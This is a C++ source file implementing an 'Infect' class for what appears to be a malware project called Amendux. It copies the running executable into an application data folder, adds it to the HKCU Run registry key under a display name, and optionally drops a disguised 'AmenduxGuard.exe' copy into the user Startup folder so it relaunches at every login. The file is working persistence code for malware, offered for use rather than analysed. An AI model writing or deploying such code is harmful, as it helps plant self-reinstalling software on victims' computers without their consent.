#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "RegDB.h"
#include "Infect.h"

using namespace Amendux;

Infect *Infect::s_Infect = nullptr;

Infect::Infect()
{
	Log::Info(L"Infect", L"Initialize infect class");
}


Infect::~Infect()
{
	Log::Info(L"Infect", L"Terminate infect class");
}


void Infect::InitClass()
{
	if (!Config::Current()->CanInfect()) {
		return;
	}

	SetupHomeDirectory();
	SetupRegisterHook();
	SetupStartupFolder();
}


void Infect::SetupHomeDirectory()
{
	std::wstring curPath = Util::currentModule();
	std::wstring appDir = Config::Current()->DataDirectory();
	std::wstring fullAppDir = appDir + L"\\" + Config::Current()->ExeName();
	
	if (curPath == fullAppDir) {
		return;
	}

	Log::Info(L"Infect", L"Copy to application directory");

	Util::deleteFile(fullAppDir.c_str());
	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)fullAppDir.c_str());

#if DEBUG
	std::ofstream lock;
	lock.open(appDir + L"\\.VXLOCK");
	lock.close();
#endif
}


void Infect::SetupRegisterHook()
{
	Log::Info(L"Infect", L"Set register hooks");

	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"); //TODO
	std::wstring appDir = Config::Current()->DataDirectory();
	appDir += L"\\" + Config::Current()->ExeName();

	LPCWSTR newExecPath = appDir.c_str();
	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, Config::Current()->DisplayName().c_str(), newExecPath, static_cast<DWORD>(Util::bytesInWCharStr(newExecPath)));
}


void Infect::SetupStartupFolder()
{
#if SECURE_BOOT
	// TODO
	std::wstring curPath = Util::currentModule();
	std::wstring startDir = Util::getDirectory(Util::Directory::USER_STARTUP);
	startDir += L"\\AmenduxGuard.exe";

	if (curPath == startDir) {
		return;
	}

	Log::Info(L"Infect", L"Copy guard");

	Util::deleteFile(startDir.c_str());
	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)startDir.c_str());
#endif
}